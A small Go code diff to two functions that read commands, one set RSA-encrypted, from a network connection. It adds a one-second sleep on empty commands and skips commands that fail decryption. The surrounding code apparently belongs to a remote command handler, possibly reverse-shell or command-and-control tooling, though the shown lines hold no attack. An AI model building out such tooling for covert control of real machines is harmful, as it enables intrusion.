@@ -36,6 +36,7 @@ func Handler(conn net.Conn, OS_info string, conn_update <-chan *net.Conn) {
 		// Extract the command from the buffer
 		var command string = string(buf[:n])
 		if len(command) == 0 {
+			time.Sleep(1 * time.Second) // Prevent high CPU usage
 			continue
 		}
 
@@ -98,6 +99,11 @@ func Handler_RSA(conn net.Conn, OS_info string, private_key string, public_key s
 		command, err := DecryptMessageRSA(encrypted_command, private_key)
 		if err != nil {
 			fmt.Println("Error decrypting command:", err)
+			continue
+		}
+		
+		if len(command) == 0 {
+			time.Sleep(1 * time.Second) // Prevent high CPU usage
 			continue
 		}
 
